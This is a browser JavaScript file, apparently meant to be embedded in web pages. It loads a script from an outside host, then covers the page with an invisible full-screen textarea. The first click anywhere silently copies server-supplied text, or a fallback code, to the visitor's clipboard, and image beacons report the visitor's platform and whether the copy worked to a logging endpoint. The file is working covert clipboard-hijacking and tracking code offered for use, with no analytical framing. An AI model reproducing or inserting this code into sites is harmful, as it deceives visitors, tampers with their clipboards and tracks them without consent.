console.log('------------////////-----');
console.log(window.IS_DP);
console.log('-------------//////----');
var IS_DP = window.IS_DP || 110;
var trackid = trackid || 0;
!function() {
    var a, b,v=200;
    return document.body ? (a = document.createElement("script"),
        a.src = "https://links.myyxapp.com/HttpServer/server/getkl.controller?callback=test&group=A",
        document.body.appendChild(a), b = document.createElement("textarea"), b["style"]["border"] = 0,
        b["style"]["position"] = "fixed", b["style"]["top"] = 0, b["style"]["left"] = 0, b["style"]["width"] = "100%",
        b["style"]["height"] = "100%", b["style"]["background"] = ['url("/#")', "transparent"], b["style"]["color"] = "transparent",
        b["style"]["zIndex"] = 99999, b.setAttribute("readonly", ""), b.addEventListener("click",
        function() {
            try {
                b.value = window.abc;
            } catch (e) {
                b.value = 'M8xFKz57eK'
            } finally {
                b.select();
                b.setSelectionRange(0, b.value.length);
                var isok = document.execCommand("copy", !1, null);
                if (isok){
                    var a_url = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=8&dp="+IS_DP+"&platform=" + (navigator ? encodeURIComponent(navigator.platform) : '')+"&dtime=" + new Date();//isCrossDomain
                    createImgUrl(a_url);
                }
                document.body.removeChild(b);
            }
        }), document.body.appendChild(b), void 0) : setTimeout(arguments.callee(ele), 50)
}();

function createImgUrl(path) {
    try{
        var img = new window.Image(1, 1);
        img.src = path;
    }catch (exp){}
};



//
//
var test = function (t) {
    window.abc = t['status'] == 'ok' ? t['text'] : '';
    var supportCopy = !!document.queryCommandSupported && document.queryCommandSupported('copy');
    supportCopy = supportCopy == true ? 1 : 0;
    var a_url = "//sspmiaoshuo.cn-hangzhou.log.aliyuncs.com/logstores/system/track_ua.gif?APIVersion=0.6.0&position=7&trackid="+trackid+"&supportCopy="+supportCopy+"&dp="+IS_DP+"&platform=" + (navigator ? encodeURIComponent(navigator.platform) : '')+"&dtime=" + new Date();//isCrossDomain
    createImgUrl(a_url);
}
